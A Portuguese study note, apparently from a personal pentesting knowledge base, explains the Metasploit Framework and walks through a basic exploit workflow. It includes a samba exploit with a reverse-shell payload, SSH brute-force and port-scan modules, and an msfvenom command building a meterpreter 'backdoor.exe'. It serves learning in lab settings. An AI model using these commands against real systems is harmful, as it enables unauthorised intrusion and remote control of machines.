---
title: Metasploit
description: Nmap - O que e
tags:
  - "#Ferramentas"
lastmod: 2025-10-02
date: 2025-10-02
weight: 31
---
---
# Conceito Geral

O **Metasploit Framework** é uma das ferramentas mais conhecidas no mundo de **pentest** e **segurança ofensiva**.  
Ele é um **framework de exploração** que fornece uma coleção enorme de **exploits, payloads, scanners, auxiliares e pós-exploração**, facilitando a identificação e exploração de vulnerabilidades em sistemas.

Criado originalmente em **2003**, hoje é mantido pela **Rapid7** e está disponível em código aberto.

---
## Estrutura básica

O Metasploit possui **quatro componentes principais**:

1. **Exploits** → Código que aproveita falhas de segurança.
2. **Payloads** → Código executado após o exploit (ex: abrir uma shell).
3. **Auxiliaries** → Módulos auxiliares como scanners, sniffers, fuzzers.
4. **Post** → Scripts para atividades de pós-exploração.

---
## Como usar (fluxo básico)

1. **Iniciar o console**
```
msfconsole
```

2. **Buscar por exploits ou módulos**
   ```
   search samba
   ```

3. **Selecionar um módulo**
   ```
   use exploit/unix/samba/trans2open
   ```

4. **Ver opções do módulo**
   ```
   show options
   ```

5. **Configurar parâmetros**
 ```
set RHOST 192.168.1.10
set RPORT 445
 ```

6. **Definir o payload**
```
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.1.100
```

7. **Executar o exploit**
```
exploit
```

---

## Exemplos de uso útil

* **Scanner de portas e serviços** (sem precisar de exploit):
```
use auxiliary/scanner/portscan/tcp
```

* **Força bruta em serviços**:
```
use auxiliary/scanner/ssh/ssh_login
```

* **Criar payload com o msfvenom**:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe
```

---
## Dicas práticas

- Use em **ambiente controlado** (laboratórios/VMs), nunca em redes de terceiros sem permissão.
- Combine com **Nmap** → escaneie a rede primeiro e depois use os exploits correspondentes.
- Sempre rode `show options` antes de executar, muitos erros vêm de configurações incompletas.
- O módulo `searchsploit` (do exploit-db) é um bom complemento para achar exploits e depois usá-los no Metasploit.
- O **Meterpreter** é um dos payloads mais poderosos: permite capturar tela, keylogger, pivoting e muito mais.

---